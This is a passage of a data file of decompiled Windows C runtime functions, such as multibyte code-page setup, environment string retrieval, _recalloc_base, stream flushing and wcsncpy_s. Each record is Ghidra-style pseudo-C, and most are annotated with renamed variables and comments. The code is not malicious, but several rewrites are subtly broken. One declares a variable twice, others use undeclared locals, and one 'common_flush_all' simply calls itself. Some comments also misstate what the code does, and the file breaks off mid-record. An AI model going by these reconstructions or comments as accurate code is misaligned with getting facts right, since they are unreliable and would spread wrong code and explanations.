+ 0x3a8) & DAT_1400381a4) == 0) || (*(longlong *)(param_1 + 0x90) == 0)) {\n        __acrt_lock(5);\n        p_Var2 = *(__crt_multibyte_data **)(param_1 + 0x88);\n        if (p_Var2 != *param_2) {\n            if (p_Var2 != (__crt_multibyte_data *)0x0) {\n                LOCK();\n                iVar1 = *(int *)p_Var2;\n                *(int *)p_Var2 = iVar1 - 1;\n                UNLOCK();\n                if ((iVar1 == 1) && (p_Var2 != (__crt_multibyte_data *)&DAT_1400387d0)) {\n                    _free_base(p_Var2);\n                }\n            }\n            p_Var2 = *param_2;\n            *(__crt_multibyte_data **)(param_1 + 0x88) = p_Var2;\n            LOCK();\n            *(int *)p_Var2 = *(int *)p_Var2 + 1;\n            UNLOCK();\n        }\n        __acrt_unlock(5);\n    } else {\n        p_Var2 = *(__crt_multibyte_data **)(param_1 + 0x88);\n    }\n\n    if (p_Var2 != (__crt_multibyte_data *)0x0) {\n        return p_Var2;\n    }\n    abort();\n}\n"}
{"Function Name": "__acrt_initialize_multibyte", "Address": "1400194ac", "Source Code": "\nundefined8 __acrt_initialize_multibyte(void)\n{\n    // Check if the multibyte initialization flag is not set\n    if (is_multibyte_initialized == '\\0') {\n        // Set pointers to the multibyte data structures\n        first_multibyte_structure = &DAT_1400385d0; // Pointer to the first multibyte data structure\n        second_multibyte_structure = &DAT_1400387d0; // Pointer to the second multibyte data structure\n        third_multibyte_structure = &DAT_1400384c0; // Pointer to the third multibyte data structure\n        \n        // Set the initialization flag to indicate multibyte data has been initialized\n        is_multibyte_initialized = '\\x01';\n        \n        // Call a function to initialize multibyte data and return the result\n        return CONCAT71((int7)((ulonglong)FUN_140019230(-3, '\\x01', __acrt_getptd_head(), (__crt_multibyte_data **)&second_multibyte_structure) >> 8), 1);\n    }\n    \n    // If already initialized, return a default value\n    return CONCAT71(0, 1);\n}\n"}
{"Function Name": "__acrt_update_thread_multibyte_data", "Address": "14001950c", "Source Code": "\nvoid updateThreadMultibyteData(void)\n{\n    // Call the internal function to update the thread's multibyte data\n    // Pass the current thread's data structure and a pointer to the multibyte data\n    internalUpdateThreadMultibyteData((__acrt_ptd *)getThreadData(), (__crt_multibyte_data **)&multibyteDataPointer);\n}\n"}
{"Function Name": "_setmbcp_nolock", "Address": "140019528", "Source Code": "\nvoid _setmbcp_nolock(int codePage, __crt_multibyte_data *multibyteData)\n{\n    byte currentByte; // Variable to hold a byte value\n    uint systemCodePage; // Variable to hold the system code page\n    BOOL isValid; // Variable to hold boolean status\n    uint *dataPointer; // Pointer to a uint variable\n    undefined *nullPointer; // Pointer to an undefined type\n    longlong loopCounter; // Variable for long long integer\n    BYTE *leadBytePointer; // Pointer to a BYTE variable\n    uint flagValue; // Variable to hold a uint value\n    uint firstLeadByte; // Variable to hold another uint value\n    uint leadByteValue; // Variable to hold another uint value\n    byte *leadByteArray; // Pointer to a byte variable\n    byte *multibyteDataPointer; // Pointer to another byte variable\n    __crt_multibyte_data *multibyteDataPointer; // Pointer to multibyte data structure\n    ulonglong securityCookie; // Local variable for storing a long long integer\n\n    // XOR local_40 with a constant to initialize it\n    securityCookie = DAT_140038080 ^ (ulonglong)(&securityCookie);\n    // Get the system code page based on the input parameter\n    systemCodePage = getSystemCP(codePage);\n    nullPointer = (undefined *)0x0; // Initialize pointer to null\n\n    // Check if the code page is valid\n    if (systemCodePage != 0) {\n        dataPointer = &DAT_1400386e0; // Set pointer to a specific data location\n        flagValue = 1; // Initialize uVar14 to 1\n    LAB_14001956f:\n        // Check if the current code page matches the system code page\n        if (*dataPointer != systemCodePage) goto code_r0x000140019577;\n        // Initialize multibyte data structure\n        FUN_14000c740((undefined1 (*) [16])(multibyteData + 0x18), 0, 0x101);\n        multibyteDataPointer = &DAT_1400386d0; // Set pointer to another data location\n        loopCounter = 4; // Set loop counter\n        leadByteArray = &DAT_1400386f0 + (longlong)nullPointer * 0x30; // Initialize pbVar15\n\n        // Loop to process lead bytes\n        do {\n            currentByte = *leadByteArray; // Get the current byte\n            // While there are valid lead bytes\n            while ((currentByte != 0 && (leadByteArray[1] != 0))) {\n                leadByteValue = (uint)currentByte; // Cast byte to uint\n                // If the first lead byte is less than or equal to the second\n                if (currentByte <= leadByteArray[1]) {\n                    firstLeadByte = (uint)currentByte; // Store the first lead byte\n                    do {\n                        firstLeadByte = firstLeadByte + 1; // Increment the lead byte\n                        if (0x100 < firstLeadByte) break; // Break if out of range\n                        // Update the multibyte data structure\n                        multibyteData[(ulonglong)firstLeadByte + 0x18] = (__crt_multibyte_data)((byte)multibyteData[(ulonglong)firstLeadByte + 0x18] | *multibyteDataPointer);\n                    } while (leadByteValue <= leadByteArray[1]); // Continue until the end of the range\n                }\n                leadByteArray += 2; // Move to the next pair of lead bytes\n                currentByte = *leadByteArray; // Get the next byte\n            }\n            leadByteArray += 8; // Move to the next set of lead bytes\n            multibyteDataPointer += 1; // Increment the pointer for the multibyte data\n            loopCounter--; // Decrement the loop counter\n        } while (loopCounter != 0); // Continue until the loop counter reaches zero\n\n        *(uint *)(multibyteData + 4) = systemCodePage; // Store the code page in the multibyte data structure\n        *(undefined4 *)(multibyteData + 8) = 1; // Set a flag in the multibyte data structure\n        // Determine the pointer based on the code page\n        nullPointer = (systemCodePage == 0x3a4) ? PTR_u_ja_JP_14002bff0 :\n                 (systemCodePage == 0x3a8) ? PTR_u_zh_CN_14002bff8 :\n                 (systemCodePage == 0x3b5) ? PTR_u_ko_KR_14002c000 :\n                 (systemCodePage == 0x3b6) ? (undefined *)0x0 : PTR_u_zh_TW_14002c008;\n\n        *(undefined **)(multibyteData + 0x220) = nullPointer; // Store the determined pointer\n        multibyteDataPointer = multibyteData + 0xc; // Set pointer to the multibyte data structure\n        loopCounter = 6; // Set loop counter for the next operation\n\n        // Loop to copy data from the determined pointer to the multibyte data structure\n        do {\n            *(undefined2 *)multibyteDataPointer = *(undefined2 *)(multibyteDataPointer + ((longlong)nullPointer * 0x30 - (longlong)multibyteData) + 0x1400386d8);\n            multibyteDataPointer += 2; // Move to the next position in the multibyte data structure\n            loopCounter--; // Decrement the loop counter\n        } while (loopCounter != 0); // Continue until the loop counter reaches zero\n        goto LAB_1400195cb; // Jump to the end of the function\n    }\n\nLAB_1400197b2:\n    setSBCS(multibyteData); // Set single-byte character set\nLAB_1400197bc:\n    __security_check_cookie(securityCookie ^ (ulonglong)(&securityCookie)); // Check for security cookie\n    return; // Exit the function\n\ncode_r0x000140019577:\n    // Check for specific code pages or validity\n    if ((systemCodePage == 65000) || (isValid = IsValidCodePage(systemCodePage & 0xffff), isValid == 0)) goto LAB_1400197bc;\n\n    // Handle special case for code page 0xfde9\n    if (systemCodePage == 0xfde9) {\n        *(undefined8 *)(multibyteData + 4) = 0xfde9; // Set the code page\n        *(undefined8 *)(multibyteData + 0x220) = 0; // Clear the pointer\n        *(undefined4 *)(multibyteData + 0x18) = 0; // Clear the multibyte data\n        *(undefined2 *)(multibyteData + 0x1c) = 0; // Clear the multibyte data\n    } else {\n        // Get code page information\n        isValid = GetCPInfo(systemCodePage, &local_58);\n        if (isValid == 0) { // If failed to get info\n            if (DAT_14003a9a8 == 0) goto LAB_1400197bc; // Check another condition\n            goto LAB_1400197b2; // Jump to set SBCS\n        }\n        // Initialize multibyte data structure\n        FUN_14000c740((undefined1 (*) [16])(multibyteData + 0x18), 0, 0x101);\n        *(uint *)(multibyteData + 4) = systemCodePage; // Store the code page\n        *(undefined8 *)(multibyteData + 0x220) = 0; // Clear the pointer\n\n        // Check if the maximum character size is 2\n        if (local_58.MaxCharSize == 2) {\n            leadBytePointer = local_58.LeadByte; // Get the lead byte array\n            // Process lead bytes\n            while ((local_58.LeadByte[0] != 0 && (leadBytePointer[1] != 0))) {\n                currentByte = *leadBytePointer; // Get the current lead byte\n                // If the first lead byte is less than or equal to the second\n                if ((uint)currentByte <= (uint)leadBytePointer[1]) {\n                    systemCodePage = (uint)currentByte; // Store the first lead byte\n                    rangeCounter = (ulonglong)(((uint)leadBytePointer[1] - (uint)currentByte) + 1); // Calculate the range\n                    do {\n                        systemCodePage = systemCodePage + 1; // Increment the lead byte\n                        // Update the multibyte data structure\n                        multibyteData[(ulonglong)systemCodePage + 0x18] = (__crt_multibyte_data)((byte)multibyteData[(ulonglong)systemCodePage + 0x18] | 4);\n                        rangeCounter--; // Decrement the range counter\n                    } while (rangeCounter != 0); // Continue until the range counter reaches zero\n                }\n                leadBytePointer += 2; // Move to the next pair of lead bytes\n                local_58.LeadByte[0] = *leadBytePointer; // Update the lead byte array\n            }\n            multibyteDataPointer = multibyteData + 0x1a; // Set pointer to the multibyte data structure\n            loopCounter = 0xfe; // Set loop counter\n\n            // Loop to set additional flags in the multibyte data structure\n            do {\n                *multibyteDataPointer = (__crt_multibyte_data)((byte)*multibyteDataPointer | 8); // Set flag\n                multibyteDataPointer++; // Move to the next position\n                loopCounter--; // Decrement the loop counter\n            } while (loopCounter != 0); // Continue until the loop counter reaches zero\n            flagValue = 0; // Set uVar14 to 0\n        } else {\n            flagValue = 0; // Set uVar14 to 0\n        }\n        *(undefined4 *)(multibyteData + 8) = flagValue; // Store the flag in the multibyte data structure\n    }\n\n    multibyteDataPointer = multibyteData + 0xc; // Set pointer to the multibyte data structure\n    // Loop to clear additional data in the multibyte data structure\n    for (loopCounter = 6; loopCounter != 0; loopCounter--) {\n        *(undefined2 *)multibyteDataPointer = 0; // Clear the data\n        multibyteDataPointer += 2; // Move to the next position\n    }\nLAB_1400195cb:\n    setSBUpLow(multibyteData); // Set up low and high byte settings\n    goto LAB_1400197bc; // Jump to the end of the function\n}\n"}
{"Function Name": "FUN_1400197e4", "Address": "1400197e4", "Source Code": "\nundefined1 FUN_1400197e4(void)\n{\n    // Retrieve the command line string in ANSI format and store it in _DAT_14003a9d0\n    commandLineAnsi = GetCommandLineA();\n    \n    // Retrieve the command line string in Unicode format and store it in _DAT_14003a9d8\n    commandLineUnicode = GetCommandLineW();\n    \n    // Return 1 indicating successful execution\n    return 1;\n}\n"}
{"Function Name": "__dcrt_get_wide_environment_from_os", "Address": "14001980c", "Source Code": "\nundefined8 * __dcrt_get_wide_environment_from_os(void)\n{\n    LPWCH wideEnvStrings; // Pointer to the wide character environment strings\n    undefined8 *allocatedEnvMemory; // Pointer to the allocated memory for the environment strings\n    WCHAR *currentEnvString; // Pointer used to traverse the environment strings\n    ulonglong allocatedMemorySize; // Variable to hold the size of the allocated memory\n\n    wideEnvStrings = GetEnvironmentStringsW(); // Retrieve the wide character environment strings from the OS\n    if (wideEnvStrings != (LPWCH)0x0) { // Check if the environment strings were successfully retrieved\n        currentEnvString = wideEnvStrings; // Initialize the pointer to the start of the environment strings\n        while (*currentEnvString != L'\\0') { // Loop through the environment strings until the end is reached\n            while (*currentEnvString != L'\\0') { // Inner loop to find the end of the current string\n                currentEnvString++; // Move to the next character\n            }\n            currentEnvString += 2; // Move past the null terminator of the current string to the next string\n        }\n        allocatedMemorySize = ((longlong)currentEnvString + (2 - (longlong)wideEnvStrings) >> 1) * 2; // Calculate the total size needed for the new memory allocation\n        allocatedEnvMemory = (undefined8 *)_malloc_base(allocatedMemorySize); // Allocate memory for the environment strings\n        if (allocatedEnvMemory != (undefined8 *)0x0) { // Check if memory allocation was successful\n            FUN_14000c330(allocatedEnvMemory, (undefined8 *)wideEnvStrings, allocatedMemorySize); // Copy the environment strings to the allocated memory\n        }\n        FreeEnvironmentStringsW(wideEnvStrings); // Free the memory allocated by GetEnvironmentStringsW\n        return allocatedEnvMemory; // Return the pointer to the newly allocated environment strings\n    }\n    return (undefined8 *)0x0; // Return null if the environment strings could not be retrieved\n}\n"}
{"Function Name": "_recalloc_base", "Address": "1400198ac", "Source Code": "\nLPVOID _recalloc_base(LPVOID existing_memory_block, ulonglong element_size, ulonglong element_count)\n{\n    ulonglong existing_memory_size; // Variable to store the size of the existing memory block\n    LPVOID new_memory_pointer; // Pointer to the newly allocated memory\n    ulonglong total_allocation_size; // Variable to store the total size needed for allocation\n\n    // Check if the requested size is valid\n    if ((element_size == 0) || (element_count <= 0xffffffffffffffe0 / element_size)) {\n        // Get the size of the existing memory block if it exists\n        existing_memory_size = (existing_memory_block == (LPVOID)0x0) ? 0 : _msize_base((longlong)existing_memory_block);\n        // Calculate the total size needed for the new allocation\n        total_allocation_size = element_size * element_count;\n        // Reallocate memory with the new size\n        new_memory_pointer = _realloc_base(existing_memory_block, total_allocation_size);\n        // If reallocation was successful and the new size is larger than the old size\n        if ((new_memory_pointer != (LPVOID)0x0) && (existing_memory_size < total_allocation_size)) {\n            // Initialize the newly allocated memory region\n            FUN_14000c740((undefined1 (*) [16])((longlong)new_memory_pointer + existing_memory_size), 0, total_allocation_size - existing_memory_size);\n        }\n    } else {\n        // Set error code for invalid allocation request\n        *(__doserrno()) = 0xc;\n        new_memory_pointer = (LPVOID)0x0; // Return null pointer on failure\n    }\n    return new_memory_pointer; // Return the pointer to the allocated memory\n}\n"}
{"Function Name": "FUN_140019944", "Address": "140019944", "Source Code": "\nbool isProcessHeapValid(void)\n{\n    // Check if the process heap is not a null handle\n    return getProcessHeap() != (HANDLE)0x0;\n}\n"}
{"Function Name": "__acrt_execute_initializers", "Address": "14001996c", "Source Code": "\nundefined8 __acrt_execute_initializers(undefined8 *initializers_start, undefined8 *initializers_end)\n{\n    longlong *current_initializer = initializers_start; // Initialize pointer to the start of the initializers array\n    if (initializers_start != initializers_end) { // Check if the start and end pointers are not the same\n        do {\n            // Check if the current initializer is not null and if the guard dispatch call returns 0\n            if ((*(longlong *)*current_initializer != 0) && \n                (*(code *)PTR__guard_dispatch_icall_1400213e8)() == 0) \n                break; // Exit the loop if the conditions are met\n            current_initializer += 2; // Move to the next initializer (skipping one)\n        } while (current_initializer != initializers_end); // Continue until reaching the end pointer\n        \n        // Check if the current pointer is not at the end and not at the start\n        if (current_initializer != initializers_end && current_initializer != initializers_start) {\n            current_initializer--; // Move back one position\n            do {\n                // Check if the previous initializer and the current one are not null\n                if ((current_initializer[-1] != 0) && (*current_initializer != 0)) {\n                    (*(code *)PTR__guard_dispatch_icall_1400213e8)(0); // Call the guard dispatch with 0\n                }\n                current_initializer -= 2; // Move back to the previous initializer (skipping one)\n            } while (current_initializer != initializers_start); // Continue until reaching the start pointer\n        }\n        return (ulonglong)(current_initializer + 1) & 0xffffffffffffff00; // Return the adjusted pointer value\n    }\n    return CONCAT71((int7)((ulonglong)(current_initializer + 1) >> 8), 1); // Return a specific value if start and end are the same\n}\n"}
{"Function Name": "__acrt_execute_uninitializers", "Address": "1400199ec", "Source Code": "\nundefined8 __acrt_execute_uninitializers(longlong start_address, longlong current_address)\n{\n    longlong fetched_value; // Variable to hold the value fetched from memory\n    if (start_address != current_address) { // Check if the two parameters are not equal\n        do {\n            fetched_value = *(longlong *)(current_address - 8); // Retrieve the value from memory at (param_2 - 8)\n            if (fetched_value != 0) { // Check if the retrieved value is not zero\n                fetched_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(0); // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n            }\n            current_address -= 0x10; // Decrement param_2 by 16 (0x10 in hexadecimal)\n        } while (current_address != start_address); // Continue the loop until param_2 equals param_1\n    }\n    return CONCAT71((int7)((ulonglong)fetched_value >> 8), 1); // Return a concatenated value with the upper part of in_RAX and 1\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_842d9ff0dc9ef11c61343bbaebe7f885>,class_<lambda_c5860995281e5c4ce005b3de8f5874ee>&___ptr64,class_<lambda_d90129c13df834fdcbf8d2b88dafcf2d>_>", "Address": "140019a28", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_842d9ff0dc9ef11c61343bbaebe7f885>,class_<lambda_c5860995281e5c4ce005b3de8f5874ee>&___ptr64,class_<lambda_d90129c13df834fdcbf8d2b88dafcf2d>_>\n(__crt_seh_guarded_call<void> *this,<lambda_842d9ff0dc9ef11c61343bbaebe7f885> *param_1,\n<lambda_c5860995281e5c4ce005b3de8f5874ee> *param_2,\n<lambda_d90129c13df834fdcbf8d2b88dafcf2d> *param_3)\n{\n    uint uVar1; // Variable to hold a specific value from param_2\n\n    // Call a function with the first parameter dereferenced\n    FUN_140017bfc(*(longlong *)param_1);\n\n    // Check if the first element of param_2 is not null and extract a value\n    if ((**(longlong **)param_2 != 0) &&\n        (uVar1 = *(uint *)(**(longlong **)param_2 + 0x14), (uVar1 >> 0xd & 1) != 0)) {\n        \n        // Check specific conditions based on the extracted value\n        if (((((byte)uVar1 & 3) == 2) && ((uVar1 & 0xc0) != 0)) || ((uVar1 >> 0xb & 1) != 0)) {\n            \n            // Check if a certain character in param_2 is not null or a specific bit is set\n            if ((**(char **)(param_2 + 0x10) != '\\0') ||\n                ((uVar1 >> 1 & 1) != 0)) {\n                \n                // Attempt to flush the file associated with param_2\n                if (_fflush_nolock((FILE *)**(undefined8 **)param_2) == -1) {\n                    // If flush fails, set an error code\n                    **(undefined4 **)(param_2 + 0x18) = 0xffffffff;\n                }\n                else {\n                    // If flush succeeds, increment a counter in param_2\n                    **(int **)(param_2 + 8) = **(int **)(param_2 + 8) + 1;\n                }\n            }\n        }\n        else {\n            // If the previous conditions are not met, simply increment the counter\n            **(int **)(param_2 + 8) = **(int **)(param_2 + 8) + 1;\n        }\n    }\n\n    // Call another function with the third parameter dereferenced\n    FUN_140017c08(*(longlong *)param_3);\n    return; // Exit the function\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_842d9ff0dc9ef11c61343bbaebe7f885>,class_<lambda_c5860995281e5c4ce005b3de8f5874ee>&___ptr64,class_<lambda_d90129c13df834fdcbf8d2b88dafcf2d>_>\n(__crt_seh_guarded_call<void> *this,<lambda_842d9ff0dc9ef11c61343bbaebe7f885> *param_1,\n<lambda_c5860995281e5c4ce005b3de8f5874ee> *param_2,\n<lambda_d90129c13df834fdcbf8d2b88dafcf2d> *param_3)\n{\nuint uVar1;\nFUN_140017bfc(*(longlong *)param_1);\nif ((**(longlong **)param_2 != 0) &&\n(uVar1 = *(uint *)(**(longlong **)param_2 + 0x14), (uVar1 >> 0xd & 1) != 0)) {\nif (((((byte)uVar1 & 3) == 2) && ((uVar1 & 0xc0) != 0)) || ((uVar1 >> 0xb & 1) != 0)) {\nif ((**(char **)(param_2 + 0x10) != '\\0') ||\n((uVar1 >> 1 & 1) != 0)) {\nif (_fflush_nolock((FILE *)**(undefined8 **)param_2) == -1) {\n**(undefined4 **)(param_2 + 0x18) = 0xffffffff;\n}\nelse {\n**(int **)(param_2 + 8) = **(int **)(param_2 + 8) + 1;\n}\n}\n}\nelse {\n**(int **)(param_2 + 8) = **(int **)(param_2 + 8) + 1;\n}\n}\nFUN_140017c08(*(longlong *)param_3);\nreturn;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_886d6c58226a84441f68b9f2b8217b83>,class_<lambda_ab61a845afdef5b7c387490eaf3616ee>&___ptr64,class_<lambda_f7f22ab5edc0698d5f6905b0d3f44752>_>", "Address": "140019ac4", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_886d6c58226a84441f68b9f2b8217b83>,class_<lambda_ab61a845afdef5b7c387490eaf3616ee>&___ptr64,class_<lambda_f7f22ab5edc0698d5f6905b0d3f44752>_>\n(__crt_seh_guarded_call<void> *this,<lambda_886d6c58226a84441f68b9f2b8217b83> *param_1,\n<lambda_ab61a845afdef5b7c387490eaf3616ee> *param_2,\n<lambda_f7f22ab5edc0698d5f6905b0d3f44752> *param_3)\n{\n    longlong *plVar1; // Pointer to the end of the data range\n    uint uVar2; // Variable to store a specific value from the data\n    longlong *plVar3; // Pointer for iterating through the data\n    __crt_seh_guarded_call<void> local_res10 [16]; // Local storage for results\n    longlong local_58; // Local variable for temporary storage\n    longlong local_50; // Local variable for another temporary storage\n    longlong local_48; // Local variable for yet another temporary storage\n    longlong *local_38; // Pointer to local storage for data\n\n    local_38 = &local_58; // Initialize local_38 to point to local_58\n    __acrt_lock(*(int *)param_1); // Acquire a lock using the value from param_1\n\n    plVar1 = DAT_14003a460 + DAT_14003a458; // Set plVar1 to the end of the data range\n    for (plVar3 = DAT_14003a460; plVar3 != plVar1; plVar3++) { // Iterate through the data\n        local_58 = *plVar3; // Dereference the pointer and store the value in local_58\n        if ((local_58 != 0) && (uVar2 = *(uint *)(local_58 + 0x14), (uVar2 >> 0xd & 1) != 0)) { // Check if local_58 is valid and if a specific condition is met\n            if (((((byte)uVar2 & 3) == 2) && ((uVar2 & 0xc0) != 0)) || ((uVar2 >> 0xb & 1) != 0)) { // Check additional conditions on uVar2\n                local_50 = local_58; // Store local_58 in local_50\n                local_48 = local_58; // Store local_58 in local_48\n                operator()<class_<lambda_842d9ff0dc9ef11c61343bbaebe7f885>,class_<lambda_c5860995281e5c4ce005b3de8f5874ee>&___ptr64,class_<lambda_d90129c13df834fdcbf8d2b88dafcf2d>_>\n                (local_res10,(<lambda_842d9ff0dc9ef11c61343bbaebe7f885> *)&local_48,\n                (<lambda_c5860995281e5c4ce005b3de8f5874ee> *)&local_38,\n                (<lambda_d90129c13df834fdcbf8d2b88dafcf2d> *)&local_50); // Call operator with specific parameters\n            }\n            else {\n                **(int **)param_2 = **(int **)param_2 + 1; // Increment the value pointed to by param_2\n            }\n        }\n    }\n    __acrt_unlock(*(int *)param_3); // Release the lock using the value from param_3\n    return; // Exit the function\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_886d6c58226a84441f68b9f2b8217b83>,class_<lambda_ab61a845afdef5b7c387490eaf3616ee>&___ptr64,class_<lambda_f7f22ab5edc0698d5f6905b0d3f44752>_>\n(__crt_seh_guarded_call<void> *this,<lambda_886d6c58226a84441f68b9f2b8217b83> *param_1,\n<lambda_ab61a845afdef5b7c387490eaf3616ee> *param_2,\n<lambda_f7f22ab5edc0698d5f6905b0d3f44752> *param_3)\n{\nlonglong *plVar1;\nuint uVar2;\nlonglong *plVar3;\n__crt_seh_guarded_call<void> local_res10 [16];\nlonglong local_58;\nlonglong local_50;\nlonglong local_48;\nlonglong *local_38;\nlocal_38 = &local_58;\n__acrt_lock(*(int *)param_1);\nplVar1 = DAT_14003a460 + DAT_14003a458;\nfor (plVar3 = DAT_14003a460; plVar3 != plVar1; plVar3++) {\nlocal_58 = *plVar3;\nif ((local_58 != 0) && (uVar2 = *(uint *)(local_58 + 0x14), (uVar2 >> 0xd & 1) != 0)) {\nif (((((byte)uVar2 & 3) == 2) && ((uVar2 & 0xc0) != 0)) || ((uVar2 >> 0xb & 1) != 0)) {\nlocal_50 = local_58;\nlocal_48 = local_58;\noperator()<class_<lambda_842d9ff0dc9ef11c61343bbaebe7f885>,class_<lambda_c5860995281e5c4ce005b3de8f5874ee>&___ptr64,class_<lambda_d90129c13df834fdcbf8d2b88dafcf2d>_>\n(local_res10,(<lambda_842d9ff0dc9ef11c61343bbaebe7f885> *)&local_48,\n(<lambda_c5860995281e5c4ce005b3de8f5874ee> *)&local_38,\n(<lambda_d90129c13df834fdcbf8d2b88dafcf2d> *)&local_50);\n}\nelse {\n**(int **)param_2 = **(int **)param_2 + 1;\n}\n}\n}\n__acrt_unlock(*(int *)param_3);\nreturn;\n}\n"}
{"Function Name": "common_flush_all", "Address": "140019ba4", "Source Code": "\nint __cdecl common_flush_all(bool isFlushAll)\n{\n    char flushStatus[8]; // Array to store the parameter value\n    __crt_seh_guarded_call<void> sehGuardedCalls[8]; // Array for SEH guarded calls\n    int results[2] = {0}; // Array to store results, initialized to zero\n    undefined4 valueEight1 = 8; // Variable initialized to 8\n    undefined4 valueEight2 = 8; // Another variable initialized to 8\n\n    flushStatus[0] = isFlushAll; // Store the boolean parameter in the first element of local_res8\n    __crt_seh_guarded_call<void>::operator()<class_<lambda_886d6c58226a84441f68b9f2b8217b83>, class_<lambda_ab61a845afdef5b7c387490eaf3616ee>&___ptr64, class_<lambda_f7f22ab5edc0698d5f6905b0d3f44752>>( // Call the SEH guarded operator\n        sehGuardedCalls, // Pass the SEH guarded call array\n        (class_<lambda_886d6c58226a84441f68b9f2b8217b83> *)&valueEight2, // Pass the address of local_24\n        (class_<lambda_ab61a845afdef5b7c387490eaf3616ee> *)&results, // Pass the address of local_res20\n        (class_<lambda_f7f22ab5edc0698d5f6905b0d3f44752> *)&valueEight1 // Pass the address of local_28\n    );\n\n    return (flushStatus[0] != '\\0') ? results[0] : 0; // Return the first element of local_res20 if local_res8[0] is not zero, otherwise return 0\n}\n"}
{"Function Name": "__acrt_stdio_flush_nolock", "Address": "140019c04", "Source Code": "\nundefined8 __acrt_stdio_flush_nolock(FILE *param_1)\n{\n    uint *fileStatePtr;               // Pointer to a uint for manipulating the file state\n    char *dataBuffer;                // Buffer to hold data to be written\n    int fileDescriptor;           // File handle for the file associated with param_1\n    uint bytesWritten;                // Variable to store the number of bytes written\n    uint bytesToWrite;                // Variable to store the number of bytes to write\n\n    bytesToWrite = *(uint *)((longlong)&param_1->_base + 4); // Get the state of the file from the base structure\n    if ((((byte)bytesToWrite & 3) == 2) && ((bytesToWrite & 0xc0) != 0)) { // Check if the file is in a writable state\n        bytesToWrite = *(int *)&param_1->_ptr - param_1->_cnt; // Calculate the number of bytes to write\n        *(undefined4 *)&param_1->_base = 0; // Reset the base state\n        dataBuffer = *(char **)&param_1->_cnt; // Get the buffer pointer from the file structure\n        param_1->_ptr = dataBuffer; // Set the pointer to the buffer\n\n        if (0 < (int)bytesToWrite) { // If there are bytes to write\n            fileDescriptor = _fileno(param_1); // Get the file descriptor\n            bytesWritten = _write(fileDescriptor, dataBuffer, bytesToWrite); // Write the buffer to the file\n            if (bytesToWrite != bytesWritten) { // Check if the number of bytes written is less than expected\n                LOCK(); // Acquire a lock for thread safety\n                fileStatePtr = (uint *)((longlong)&param_1->_base + 4); // Get the pointer to the file state\n                *fileStatePtr |= 0x10; // Set an error flag in the file state\n                UNLOCK(); // Release the lock\n                return 0xffffffff; // Return an error code\n            }\n            if ((*(uint *)((longlong)&param_1->_base + 4) >> 2 & 1) != 0) { // Check if the file is in a specific state\n                LOCK(); // Acquire a lock for thread safety\n                fileStatePtr = (uint *)((longlong)&param_1->_base + 4); // Get the pointer to the file state\n                *fileStatePtr &= 0xfffffffd; // Clear a specific flag in the file state\n                UNLOCK(); // Release the lock\n            }\n        }\n    }\n    return 0; // Return success\n}\n"}
{"Function Name": "_fflush_nolock", "Address": "140019c80", "Source Code": "\nint __cdecl _fflush_nolock(FILE *fileStream) // Function to flush a FILE stream without locking\n{\n    if (fileStream == (FILE *)0x0) { // Check if the provided FILE pointer is null\n        return flushAllStreams(false); // Call common_flush_all to flush all streams if null\n    }\n    \n    if ((int)flushWithoutLock(fileStream) == 0) { // Attempt to flush the specified FILE stream\n        if ((*(uint *)((longlong)&fileStream->_base + 4) >> 0xb & 1) != 0) { // Check if the stream is buffered\n            return commitChanges(getFileDescriptor(fileStream)); // Commit the changes to the file if buffered\n        }\n        return 0; // Return 0 if flush was successful and no commit is needed\n    }\n    \n    return -1; // Return -1 if flushing the stream failed\n}\n"}
{"Function Name": "common_flush_all", "Address": "140019ccc", "Source Code": "\n// Function declaration for common_flush_all, taking a boolean parameter\nint __cdecl common_flush_all(bool is_flush_all)\n{\n    // Call common_flush_all with 'true' as the argument, ignoring the input parameter\n    return common_flush_all(true);\n}\n"}
{"Function Name": "wcsncpy_s", "Address": "140019cd4", "Source Code": "\nerrno_t __cdecl wcsncpy_s(wchar_t *destinationBuffer, rsize_t destinationSize, wchar_t *sourceBuffer, rsize_t maxCharactersToCopy)\n{\n    wchar_t currentChar; // Variable to hold the current character being copied\n    ulong *errorPointer; // Pointer to store the address of the error number\n    ulong errorCode;   // Variable to hold the error code\n    rsize_t remainingCharsToCopy = maxCharactersToCopy; // Remaining characters to copy from source\n    rsize_t remainingSpaceInDestination = destinationSize; // Remaining space in destination buffer\n\n    // Check if _MaxCount is zero\n    if (maxCharactersToCopy == 0) {\n        // If both destination and size are zero, return success\n        if (destinationBuffer == (wchar_t *)0x0 && destinationSize == 0) {\n            return 0;\n        }\n    } else {\n        // Proceed only if size of destination is not zero\n        if (destinationSize != 0) {\n            // If _MaxCount is zero, set destination to null and return success\n            if (maxCharactersToCopy == 0) {\n                *destinationBuffer = L'\\0';\n                return 0;\n            }\n            // Check if source is not null\n            if (sourceBuffer != (wchar_t *)0x0) {\n                wchar_t *destinationPtr = destinationBuffer; // Pointer to destination buffer\n                // If _MaxCount is the maximum value, copy until null character or buffer limit\n                if (maxCharactersToCopy == 0xffffffffffffffff) {\n                    do {\n                        currentChar = *sourceBuffer++; // Get the next character from source\n                        *destinationPtr++ = currentChar; // Copy it to destination\n                        if (currentChar == L'\\0') break; // Stop if null character is found\n                        remainingSpaceInDestination--; // Decrease remaining size in destination\n                    } while (remainingSpaceInDestination != 0); // Continue until destination buffer is full\n                } else {\n                    // Copy characters with a limit on the number of characters to copy\n                    do {\n                        currentChar = *sourceBuffer++; // Get the next character from source\n                        *destinationPtr++ = currentChar; // Copy it to destination\n                        if ((currentChar == L'\\0') || (remainingSpaceInDestination-- == 1)) break; // Stop if null or limit reached\n                        remainingCharsToCopy--; // Decrease remaining characters to copy\n                    } while (remainingCharsToCopy != 0); // Continue until limit is reached\n                    // If no space left in destination, null-terminate the last character\n                    if (remainingCharsToCopy == 0) {\n                        *destinationPtr = L'\\0';\n                    }\n                }\n                // Check if there is still space left in destination\n                if (remainingSpaceInDestination != 0) {\n                    return 0; // Return success if space is available\n                }\n                // Handle case where _MaxCount is the maximum value\n                if (maxCharactersToCopy == 